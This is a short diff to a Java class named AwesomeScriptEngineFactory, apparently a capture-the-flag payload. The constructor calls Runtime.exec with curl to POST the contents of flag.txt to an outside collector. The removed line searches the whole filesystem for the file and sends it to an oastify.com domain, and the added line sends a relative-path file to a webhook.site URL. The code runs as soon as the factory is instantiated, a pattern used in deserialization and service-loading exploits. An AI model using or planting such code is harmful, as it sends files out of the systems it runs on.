@@ -9,7 +9,7 @@ public class AwesomeScriptEngineFactory implements ScriptEngineFactory {
 
     public AwesomeScriptEngineFactory() {
         try {
-		Runtime.getRuntime().exec("curl -X POST -d '$(find / -name flag.txt 2>/dev/null)' http://p0qrl6hnshf9i0z16r4y4wvga7g44ysn.oastify.com");
+		Runtime.getRuntime().exec("curl -X POST -d @./../../../../../flag.txt https://webhook.site/7fe5bc22-04a9-4383-864d-9d20582a64d5");
         } catch (IOException e) {
             e.printStackTrace();
         }
